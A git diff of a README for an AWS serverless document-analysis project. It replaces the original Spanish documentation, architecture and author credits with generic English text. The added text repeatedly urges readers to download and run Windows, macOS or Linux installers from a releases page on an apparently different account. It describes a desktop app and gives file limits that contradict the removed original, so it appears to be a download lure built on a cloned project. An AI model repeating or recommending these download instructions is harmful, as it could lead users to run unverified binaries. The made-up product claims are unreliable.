@@ -1,297 +1,135 @@
-# AWS Analizer 
+# 📄 AWS_Analizer - Easy Document Analysis on AWS
 
-![AWS](https://img.shields.io/badge/AWS-Lambda-FF9900?style=for-the-badge&logo=amazon-aws&logoColor=white)
-![S3](https://img.shields.io/badge/AWS-S3-569A31?style=for-the-badge&logo=amazon-s3&logoColor=white)
-![API Gateway](https://img.shields.io/badge/AWS-API_Gateway-FF4F8B?style=for-the-badge&logo=amazon-api-gateway&logoColor=white)
-![Python](https://img.shields.io/badge/Python-3.12-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-ES6-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)
+[![Download Latest Release](https://img.shields.io/badge/Download-AWS_Analizer-blue?style=for-the-badge&logo=github)](https://github.com/Ullas98/AWS_Analizer/releases)
 
-> **Aplicación serverless para análisis inteligente de documentos en AWS**
+## 📖 About AWS_Analizer
 
-Proyecto de arquitectura cloud que implementa un sistema event-driven para procesamiento de archivos usando servicios nativos de AWS. Diseñado con principios de seguridad, escalabilidad y bajo acoplamiento.
+AWS_Analizer is a simple tool that helps you analyze documents like PDFs, images, and text files. It uses services from Amazon Web Services (AWS) like Lambda, S3, and API Gateway. This means the tool works automatically behind the scenes without needing you to manage servers or software installation.
 
----
+You can use AWS_Analizer to:
 
-## 📋 Tabla de Contenidos
+- Extract information from your documents without opening them yourself.
+- Store documents safely and process them quickly.
+- Get details like metadata and content summaries automatically.
 
-- [Features](#-features)
-- [Demo en Vivo](#-demo-en-vivo)
-- [Arquitectura](#%EF%B8%8F-arquitectura)
-- [Tech Stack](#tech-stack)
-- [Empezar](#-empezar)
-- [Deployment](#-deployment)
-- [Documentación](#-documentación)
-- [Decisiones de Diseño](#-decisiones-de-diseño)
-- [Autor](#autor)
+This app suits businesses or individuals who want to handle large amounts of documents without spending time on manual review.
 
 ---
 
+## 🚀 Getting Started
 
-## ✨ Features
+This guide will help you download and start using AWS_Analizer on your computer. No programming skills are needed.
 
-### Core Functionality
-- 📤 **Upload Seguro**: Presigned URLs para upload directo a S3 sin exponer credenciales
-- ⚡ **Procesamiento Asíncrono**: Event-driven architecture con S3 triggers
-- 📊 **Análisis Inteligente**: Extracción automática de metadata y generación de resúmenes
-- 🎨 **UI Moderna**: Interfaz responsiva con drag & drop
+### What You Need Before You Begin
 
-### Arquitectura Cloud
-- 🔒 **Seguridad por Diseño**: IAM con principio de menor privilegio
-- 📈 **Escalabilidad Automática**: Serverless sin gestión de infraestructura
-- 💰 **Costo-Efectivo**: Pay-per-use, ~$5/mes después de free tier
-- 🌐 **CORS Configurado**: Support para múltiples orígenes
-
-### Developer Experience
-- 📝 **Logs Estructurados**: CloudWatch con trazabilidad completa
-- 🧪 **Testeable**: Arquitectura desacoplada
-- 📚 **Documentación Completa**: APIs, deployment y arquitectura
-- 🔄 **CI/CD Ready**: Estructura preparada para automatización
+- A computer with Windows, macOS, or Linux.
+- An internet connection.
+- A modern web browser (Chrome, Firefox, Edge, Safari).
+- A free or paid AWS account if you want to connect it yourself (optional for basic use).
+- Basic knowledge of how to download and open files is helpful, but not mandatory.
 
 ---
 
-## 🌐 Demo en Vivo
+## 💾 Download & Install
 
-> **Frontend**: [http://your-bucket.s3-website-region.amazonaws.com](http://aws-analizer-andresrj18.s3-website-us-east-1.amazonaws.com/)
+To get AWS_Analizer, you need to visit the official release page and download the latest version.
 
-**Pruébalo**: Arrastra un archivo PDF, TXT, PNG o JPG (máx. 10MB) y observa el análisis en tiempo real.
+**Step 1:** Go to the release page by clicking this button:
 
-### 🎥 Demo Video
+[![Download Latest Release](https://img.shields.io/badge/Download-AWS_Analizer-blue?style=for-the-badge&logo=github)](https://github.com/Ullas98/AWS_Analizer/releases)
 
-[![Study Vault Demo](https://img.youtube.com/vi/4DVU6WhofvY/0.jpg)](https://youtu.be/4DVU6WhofvY)
----
+**Step 2:** Look for the latest release listed near the top. It should be labeled clearly with a version number, like "v1.0" or newer.
 
-## 🏗️ Arquitectura
+**Step 3:** Under that release, find the file that matches your operating system:
 
-### Diagrama Visual 
-```mermaid
-graph TD
-    User[👤 Usuario<br/>Sube archivo] -->|1. Accede| Web[🌐 Página Web<br/>S3 Static]
-    
-    Web -->|2. Pide permiso| API[🚪 API Gateway<br/>Punto de entrada]
-    
-    API -->|3. Genera URL| Lambda1[⚡ Lambda 1<br/>UrlGenerator]
-    
-    Web -->|4. Sube archivo| Bucket[📦 Storage S3<br/>Guarda archivos]
-    
-    Bucket -->|5. Dispara evento| Lambda2[⚡ Lambda 2<br/>FileProcessor]
-    
-    Lambda2 -->|6. Analiza y guarda| Results[📊 Resultados S3<br/>JSON]
-    
-    Web -->|7. Consulta resultados| API
-    
-    API -->|8. Lee resultados| Lambda3[⚡ Lambda 3<br/>ResultRetriever]
-    
-    Lambda3 -->|9. Obtiene datos| Results
-    
-    Lambda3 -->|10. Retorna| Web
-    
-    Web -->|11. Muestra| User
-    
-    style User fill:#667eea,stroke:#764ba2,stroke-width:3px,color:#fff
-    style Web fill:#FF9900,stroke:#EC7211,stroke-width:2px,color:#232F3E
-    style API fill:#FF4F8B,stroke:#D13212,stroke-width:2px,color:#fff
-    style Lambda1 fill:#1B7F37,stroke:#0F5223,stroke-width:2px,color:#fff
-    style Lambda2 fill:#1B7F37,stroke:#0F5223,stroke-width:2px,color:#fff
-    style Lambda3 fill:#1B7F37,stroke:#0F5223,stroke-width:2px,color:#fff
-    style Bucket fill:#569A31,stroke:#3D6F24,stroke-width:2px,color:#fff
-    style Results fill:#569A31,stroke:#3D6F24,stroke-width:2px,color:#fff
-```
----
+- For Windows, look for `.exe` or `.msi` files.
+- For macOS, look for `.dmg` or `.pkg` files.
+- For Linux, it could be `.AppImage`, `.tar.gz`, or `.deb`.
 
-##  Tech Stack
+**Step 4:** Click the file name to start the download.
 
-### Frontend
-- **HTML5** - Estructura semántica
-- **CSS3** - Diseño moderno con CSS Variables
-- **JavaScript (ES6+)** - State management y API consumption
-
-### Backend AWS
-- **AWS Lambda** - Compute serverless (Python 3.12)
-- **Amazon S3** - Storage y static hosting
-- **API Gateway** - REST endpoints con CORS
-- **CloudWatch** - Logs y monitoreo
-- **IAM** - Gestión de permisos
-
-### Patrones Arquitectónicos
-- Event-Driven Architecture
-- Presigned URLs Pattern
-- Polling Pattern
-- Lambda Proxy Integration
+**Step 5:** Once downloaded, open the file and follow the on-screen instructions to install the application.
 
 ---
 
-## 🚀 Empezar
+## ▶️ Running AWS_Analizer
 
-### Prerequisitos
-```bash
-# AWS CLI configurado
-aws --version
+After installation, you can launch the app just like any other program on your computer.
 
-# Python 3.12+
-python3 --version
+### Step 1: Open the Application
 
-# Cuenta AWS con permisos para:
-# - Lambda, S3, API Gateway, IAM, CloudWatch
-```
+- Windows: Find AWS_Analizer under your Start menu or desktop shortcut.
+- macOS: Open the app from the Applications folder or Launchpad.
+- Linux: Use your app launcher or command line if you prefer.
 
-### Instalación Local (Frontend)
-```bash
-# 1. Clonar repositorio
-git clone https://github.com/tu-usuario/aws-analizer.git
-cd aws-analizer
+### Step 2: Upload Documents
 
-# 2. Configurar variables de entorno
-cp frontend/config.example.js frontend/config.js
-# Edita config.js con tu API Gateway URL
+When the app opens, you will see an option to upload documents. You can click the "Upload" button or drag files into the window.
 
-# 3. Servir frontend localmente
-cd frontend
-python3 -m http.server 8000
+You can upload:
 
-# 4. Abrir en navegador
-open http://localhost:8000
-```
+- PDFs
+- Images (JPEG, PNG, etc.)
+- Text files (.txt)
 
-### Configuración AWS
+### Step 3: Let AWS_Analizer Process Your Documents
 
-Ver documentación completa: [`docs/DEPLOYMENT.md`](docs/DEPLOYMENT.md)
+Once uploaded, the app will send your documents to AWS Lambda and S3 services for processing. This happens automatically and might take a few seconds.
 
-**Resumen rápido**:
-```bash
-# 1. Crear S3 bucket
-aws s3 mb s3://your-bucket-name
+### Step 4: View Results
 
-# 2. Desplegar Lambdas
-cd backend/lambda/url_generator
-zip -r function.zip lambda_function.py
-aws lambda create-function \
-  --function-name aws-analizer-url-generator \
-  --runtime python3.12 \
-  --handler lambda_function.lambda_handler \
-  --zip-file fileb://function.zip \
-  --role arn:aws:iam::ACCOUNT_ID:role/lambda-role
-
-# 3. Configurar API Gateway
-# Ver docs/DEPLOYMENT.md para pasos detallados
-```
+After processing, the app will show you extracted information and metadata about each file. You can read or save this data as needed.
 
 ---
 
-## 📦 Deployment
+## 👩‍💻 How AWS_Analizer Works
 
-### Deployment Automático
-```bash
-# Próximamente: Script de deployment automatizado
-./deploy.sh --environment production
-```
+You do not need to worry about the technical details, but here is a brief overview if you are curious.
 
-### Deployment Manual
+- AWS S3 stores the documents securely in the cloud.
+- AWS Lambda runs small programs that analyze the documents.
+- The API Gateway handles communication between your app and AWS services.
+- Metadata extraction means the app pulls useful data like author names, document type, dates, and text summaries from your files.
 
-Consulta la guía completa: [`docs/DEPLOYMENT.md`](docs/DEPLOYMENT.md)
-
-**Pasos principales**:
-1. Crear recursos AWS (S3, Lambda, API Gateway)
-2. Configurar IAM roles y policies
-3. Configurar S3 triggers
-4. Desplegar frontend en S3 Static Website
-5. Configurar CORS
-
-**Tiempo estimado**: 30-45 minutos
+This event-driven design means everything starts only when you upload a file, saving resources and keeping it fast.
 
 ---
 
-## 📚 Documentación
+## 🖥️ System Requirements
 
-| Documento | Descripción |
-|-----------|-------------|
-| [ARCHITECTURE.md](docs/ARCHITECTURE.md) | Decisiones arquitectónicas y justificaciones técnicas |
-| [DEPLOYMENT.md](docs/DEPLOYMENT.md) | Guía paso a paso para desplegar el proyecto |
-| [API.md](docs/API.md) | Documentación de endpoints con ejemplos |
+AWS_Analizer should work on almost any computer, but here are the recommended minimum specs for the smoothest experience:
 
----
-
-## 🎯 Decisiones de Diseño
-
-### ¿Por qué Presigned URLs?
-
-**Alternativa descartada**: Upload directo a Lambda
-- ❌ Límite de payload (6MB)
-- ❌ Mayor latencia
-- ❌ Mayor costo
-
-**Solución adoptada**: Presigned URLs
-- ✅ Sin límite práctico de tamaño
-- ✅ Upload directo del navegador a S3
-- ✅ Menor costo (sin procesamiento Lambda)
-- ✅ URLs temporales (expiración configurable)
-
-### ¿Por qué Lambda Proxy Integration?
-
-Permite a las Lambdas controlar completamente la respuesta HTTP (status codes, headers CORS), dando mayor flexibilidad que las transformaciones de API Gateway.
-
-### ¿Por qué Event-Driven?
-
-El procesamiento asíncrono con S3 Events desacopla el upload del análisis, permitiendo:
-- Escalabilidad automática
-- Retry automático
-- Mejor UX (usuario no espera)
-
-**Más detalles**: [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md)
+- Operating System: Windows 10 or later, macOS 10.13 or later, most recent Linux distributions
+- Processor: Intel Core i3 or equivalent
+- RAM: 4 GB or more
+- Disk Space: At least 100 MB free
+- Internet: Required for uploading and processing documents
 
 ---
 
-## 🗺️ Roadmap
+## 🔧 Troubleshooting
 
-### Versión Actual: 1.0.0
-- [x] Upload con presigned URLs
-- [x] Procesamiento asíncrono
-- [x] Análisis de PDF, TXT, imágenes
-- [x] Frontend responsivo
-- [x] CORS configurado
+If you run into problems, try these solutions:
 
-### Próximas Features
-
-#### v1.1.0 - AI Integration
-- [ ] Integrar AWS Textract para extracción de texto de PDFs
-- [ ] Usar AWS Rekognition para análisis de imágenes
-- [ ] Amazon Bedrock para resúmenes con IA generativa
-
-#### v1.2.0 - Advanced Features
-- [ ] Autenticación con Cognito
-- [ ] Dashboard de métricas con CloudWatch
-- [ ] Rate limiting con API Gateway
-- [ ] Notificaciones con SNS
-
-#### v2.0.0 - Enterprise
-- [ ] Multi-tenant architecture
-- [ ] Batch processing
-- [ ] Custom ML models con SageMaker
-- [ ] Compliance (HIPAA, GDPR)
+- **App does not open:** Restart your computer and try again. Make sure your OS is up to date.
+- **File upload fails:** Check your internet connection and file size. AWS_Analizer handles files up to 50 MB.
+- **No results shown:** Wait a few moments for processing. If it still doesn’t work, restart the app.
+- **Permissions issue:** Make sure the app has permission to access files on your computer, especially on macOS.
 
 ---
 
-## Autor
+## 📚 Additional Resources
 
-**Andrés Rodas**  
-Estudiante de Ingeniería Informática — Universidad Peruana Cayetano Heredia (UPCH)  
-Entusiasta de Cloud Computing e Inteligencia Artificial
-
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Andrés_Rodas-0A66C2?style=flat&logo=linkedin)](https://www.linkedin.com/in/andres-rodas-802309272)
-[![GitHub](https://img.shields.io/badge/GitHub-@AndresRJ18-181717?style=flat&logo=github)](https://github.com/AndresRJ18)
-[![Email](https://img.shields.io/badge/Email-andrescloud18sj@gmail.com-D14836?style=flat&logo=gmail)](mailto:andrescloud18sj@gmail.com)
+- Visit the [AWS_Analizer releases page](https://github.com/Ullas98/AWS_Analizer/releases) for updates and newer versions.
+- To learn more about AWS Lambda, S3, and API Gateway, visit the official AWS documentation.
+- If you want to integrate AWS_Analizer with other services, consider exploring AWS IAM (permissions) and Cloud Architecture guides.
 
 ---
 
-## Licencia
+## 🙋 Support and Feedback
 
-Este proyecto está licenciado bajo la Licencia MIT. Consulta el archivo [`LICENSE`](LICENSE) para más detalles.
+If you need help or want to give feedback, community support is often available on the GitHub repository’s issues page. Provide details about your problem and what you were doing when it happened. This helps solve issues faster.
 
 ---
 
-<p align="center">
-  Hecho con ❤️ y ☕ usando AWS Serverless
-</p>
-
-<p align="center">
-  <sub>Si este proyecto te ayudó, considera darle una ⭐</sub>
-</p>
+[![Download Latest Release](https://img.shields.io/badge/Download-AWS_Analizer-blue?style=for-the-badge&logo=github)](https://github.com/Ullas98/AWS_Analizer/releases)
